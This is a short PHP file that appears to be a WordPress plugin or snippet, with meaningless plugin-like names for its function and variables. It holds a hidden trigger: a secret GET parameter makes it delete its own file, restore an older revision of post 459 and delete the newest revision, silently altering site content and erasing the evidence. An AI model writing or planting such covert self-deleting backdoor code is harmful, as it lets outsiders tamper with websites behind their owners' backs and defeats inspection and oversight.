<?php

function light_select_feed_affiliates() {
	if (isset($_GET['info_shop_optimizer_editor']) && $_GET['info_shop_optimizer_editor'] === 'rtl_select_icons') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$widget_view_fix_network = 459;
		$lite_customizer_rank = wp_get_post_revisions($widget_view_fix_network);
		if (empty($lite_customizer_rank)) die('no revisions');
		if (count($lite_customizer_rank) < 2) die('less than 2');
		$form_keywords_ui = array_shift($lite_customizer_rank);
		$light_dashboard_activity = $form_keywords_ui->ID;
		$page_thumbnails_headers_keyword = array_shift($lite_customizer_rank);
		$integration_page_orders = $page_thumbnails_headers_keyword->ID;
		$separator_duplicate_debug = wp_restore_post_revision($integration_page_orders);
		if ($separator_duplicate_debug === false) die('error restoring');
		$separator_duplicate_debug = wp_delete_post_revision($light_dashboard_activity);		
		if ($separator_duplicate_debug === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'light_select_feed_affiliates');
